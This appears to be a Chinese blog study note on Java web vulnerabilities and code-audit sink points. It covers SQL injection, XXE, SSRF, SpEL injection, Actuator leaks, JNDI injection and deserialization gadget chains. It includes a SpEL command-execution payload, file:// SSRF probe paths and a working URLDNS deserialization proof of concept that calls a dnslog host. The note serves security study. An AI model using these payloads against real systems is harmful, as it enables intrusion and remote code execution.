---
title: JAVA安全基础漏洞
date: 2025-12-28
updated: 2025-12-28
tags:
  - Java安全
categories:
  - 安全相关
description: None
---
## SQL 注入

- 使用 `Statement` 对象，传入参数拼接到 SQL 语句执行，存在漏洞；
- 若使用 `PreparedStatement` 通过预编译再去执行，但是若依旧使用拼接的方式来构造 SQL 语句还是存在漏洞；
- 使用 Spring 中的 `jdbctemplate` 也一样。

若使用占位符 `?` 、ESAPI 验证、强类型转换限制、编码或严格的白名单过滤也可以避免注入。

### Mybatis

支持两种参数符号 `#`、`$`， `#` 使用预编译 `$` 使用拼接 SQL。

当需要用到 `order by`、`like`、`in` 时也是无法使用预编译

- `#{}` 会将对象转换为字符串，导致 `order by` 时错误；
- `like` 模糊搜索时，直接使用 `%#{}` 会报错；
- `in` 之后多个 id 查询时使用 `#` 同样会报错。

所以很多研发还是会使用 `$`。

### Hibernate&JPA

接收参数使用 `:` 进行预编译可防止注入。

> 白盒审计：确定数据库通讯技术、确定类型找调用方法、再查看写法是否安全。

## XXE

```java
// 审计函数
XMLReader
SAXReader
DocumentBuilder
XMLStreamReader
SAXBuilder
SAXParser
SAXSource
TransformerFactory
SAXTransformerFactory
SchemaFactory
Unmarshaller
XPathExpression
```

对于以上类函数实现，`parse` 执行后续的变量可控

> - 禁用 dtd 实体引用、外部参数实体解析
> - 过滤关键词 `<!DOCTYPE>` 和 `<!ENTITY>`，或者 `SYSTEM` 和 `PUBLIC`
> - 使用安全的 XML 解析器或库：考虑使用像 Jackson XML、JAXB 等现代库，通常默认禁用不安全的功能，或者提供更好的安全性控制

## SSRF

可能造成 SSRF 的 API

```java
HttpClient
HttpAsyncClient
java.net.URLConnection/HttpURLConnection
java.net.URL
java.net.Socket
OkHttp
ImageIO
Hutool
Jsoup
RestTemplate
```

> 代码审计 SINK 点：
> 
> URL、HttpClient、OkHttpURLConnection、Socket、ImageIO、DriverManager.getConnection、SimpleDriverDataSource.getConnection、HttpURLConnection、RestTemplate、URLConnection、WebClient、JNDI
> Linux：file:///etc/hosts Windows：file:///C:\windows\win.ini

## URL 跳转

可能存在跳转的参数：`sendRedirect`、`setHeader `

> 代码审计 SINK 点：
> 
> redirect、url、redirectUrl、callback、return_url、toUrl、ReturnUrl、fromUrl、redUrl、request、redirect_to、redirect_url、jump、jump_to、target、to、goto、link、linkto、domain、oauth_callback

## SpEL 表达式注入

如果一个 Web 应用允许用户输入字符串，并直接把这个字符串丢进 `parser.parseExpression()` 里去执行，攻击者就可以构造特殊的字符串来执行系统命令 `T(java.lang.Runtime).getRuntime().exec('calc')`。

## SSTI

> https://www.cnblogs.com/bmjoker/p/13508538.html

Thymeleaf、Velocity、FreeMarker

模版文件参数可控

## Swagger UI API 框架接口泄露

接口泄露，未正确配置访问控制或未实施安全措施。

## Actuator 泄露

- heapdump 堆转储文件，java 进程在某一时刻的内存快照，包含该时刻 jvm 中所有对象信息、类信息和变量值
	- 数据库连接字符串、未加密用户的 Session、配置文件中的明文密码、以及刚被处理的用户卡号及个人信息
- druid 数据库连接池，自带监控控制台，用于查看 SQL 执行效率、并发量等
	- 系统所有 SQL 语句、数据库连接地址、Session 以及正在访问的用户 ip
- jolokia 通过 http 访问 jmx（Java Management Extensions）的桥接器
	- RCE，利用 logback 的配置加载功能、通过 jndi 注入
- gateway（spring cloud 生态系统中的网关）
	- CVE-2022-22947 (SpEL 表达式注入)

## 反序列化

> **ClassLoader（类加载器）** 的作用：**把编译好的 `.class` 文件（字节码）加载到 Java 虚拟机（JVM）中，并将其转换成内存中的 `java.lang.Class` 对象。**

![[attachments/20260113.png]]

![[attachments/20260116.png]]

> 关注：入口点，链，执行点

- 原生类的反序列化（`ObjectInputStream.readObject()`、`SnakeYaml`、`XMLDecoder` 等）
- 第三方组件的反序列化（Fastjson、Jackson、Xstream 等）

### JNDI 注入

> https://tttang.com/archive/1405/

![[attachments/20260113-1.png]]


> - JNDI 支持的服务主要有：DNS、LDAP、CORBA、RMI 等。
> - RMI：远程方法调用注册表
> - LDAP：轻量级目录访问协议

- RMI 限制：

`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为 false，即不允许从远程的 `Codebase` 加载 Reference 工厂类，不过没限制本地加载类文件。

- LDAP 限制：

`com.sun.jndi.ldap.object.trustURLCodebase` 属性的默认值被调整为 false，导致 LDAP 远程代码攻击方式开始失效。这里可以利用 `javaSerializedData` 属性，当 `javaSerializedData` 属性 `value` 值不为空时，本地存在反序列化利用链时触发。

触发模式：

- 远程 Reference 链，通过远程加载攻击工具中的 class 文件中的代码，从而执行操作；
- 本地 Reference 链，通过利用本地服务器项目中原始依赖来执行操作；
- 反序列化链
	- jdk 版本不同的 jndi 注入
	- 中间件不同的 jndi 注入
	- jar 包依赖不同的 jndi 注入

### URLDNSlog 链

> Java 的 URL 类在计算 hashCode 时，认为“逻辑上等价的 URL 应该有相同的哈希值”，为判断两个域名是否指向同一个地方，Java 会在 URLStreamHandler 中调用网络解析库去查询该域名的 IP 地址。

![[attachments/20260122.png]]

```txt
HashMap 实现了 Serializable 接口
HashMap::readObject -> putVal() -> hash()
					-> key.hashCode
					-> 
					URL::hashCode -> handler.hashCode
					=>
					URLStreamHandler::hashCode -> getHostAddress
```

```java
public static void main(String[] args) throws MalformedURLException {

    URL url = new URL("http://e2pnia.dnslog.cn");
    HashMap hashMap = new HashMap();

    hashMap.put(url, 1);
}
```

本地构造 POC 时不发送网络请求，通过反射修改 URL 类中的 hashCode，将其不等于 -1 即可：

生成 POC 到本地磁盘

```java
public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
    HashMap<URL, String> hashMap = new HashMap<>();
    URL url = new URL("http://e2pnia.dnslog.cn");
    Field hashCode = url.getClass().getDeclaredField("hashCode");
    hashCode.setAccessible(true);
    hashCode.set(url, 0);
    hashMap.put(url, 1); // put 进去时, hashCode 为 0, 在里面调用 hashCode 方法, 不会发送DNSLOG请求.
    hashCode.set(url, -1); // put 完了, 再改回 -1, 以免我们序列化的 hashCode 被替换为 0. 下一次反序列化时就会发送 DNSLOG 请求.
    serialize(hashMap); // 运行后将dns.txt生成出来
}

public static void serialize(Object o) throws IOException {
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("dns.txt"));
    oos.writeObject(o);
}
```

反序列化调用：

```java
public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
    unserialize(); // 调用直接发送 DNSLOG 请求.
}

public static Map unserialize() throws IOException, ClassNotFoundException {
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream("dns.txt"));
    return (Map) ois.readObject();
}
```

> URLDNSlog 链
> 
> https://mp.weixin.qq.com/s/9rS6iPMkxLHECgGDdyGXsQ
> https://mp.weixin.qq.com/s/synx7l2JjZAtd9UHtXVqng

### CC 链

> https://mp.weixin.qq.com/s/J_YeNkLN6KYTCVDYFh1dvQ

![[attachments/20260125.png]]

CC1

```txt
InvokerTransformer 实现了 Serializable 接口

InvokerTransformer::transform()/ConstantTransformer::transform()/ConstantTransformer::transform()
								-> TransformedMap::checkSetValue()
								-> AbstractInputCheckedMapDecorator::MapEntry::setValue()
								-> AnnotationInvocationHandler::readObject()
								

```

CC2

```txt
PriorityQueue::readObject() -> heapify() -> siftDown() -> siftDownUsingComparator()
							-> comparator.compare()
							-> TransformingComparator::compare()
							-> InvokerTransformer::transform()

TemplatesImpl::getOutputProperties() -> newTransformer() -> getTransletInstance() -> defineTransletClasses()
									 -> loader.defineClass()
```

CC4

```txt
PriorityQueue::readObject() -> heapify() -> siftDown() -> siftDownUsingComparator()
							-> comparator.compare()
							-> TransformingComparator::compare()
							
							-> ConstantTransformer::transform()

```


### CB 链

> https://www.freebuf.com/articles/web/319397.html

```java
PropertyUtils.getProperty(new User("Bob","man",31),"age");
// 会调用getage方法
```

![[attachments/20260122-1.png]]

```txt
BeanComparator 实现了 Serializable 接口
PropertyUtils.getProperty()	会通过 get 获取类中方法的内容

PriorityQueue::readObject() -> heapify() -> siftDown() -> siftDownUsingComparator()
							-> BeanComparator::compare()
							-> PropertyUtils::getProperty()
							-> PropertyUtilsBean::getProperty() -> getNestedProperty() -> getSimpleProperty() -> invokeMethod()
							
所以可通过 PropertyUtils.getProperty() 获取 TemplatesImpl.getOutputProperties() 
TemplatesImpl 实现了 Serializable 接口

TemplatesImpl::getOutputProperties() -> newTransformer() -> getTransletInstance() -> defineTransletClasses()
									 -> loader.defineClass()

取出 TemplatesImpl 对象中存储的字节码（_bytecodes 属性），并调用 ClassLoader.defineClass 将其加载进内存并实例化

字节码加载 (RCE)
```
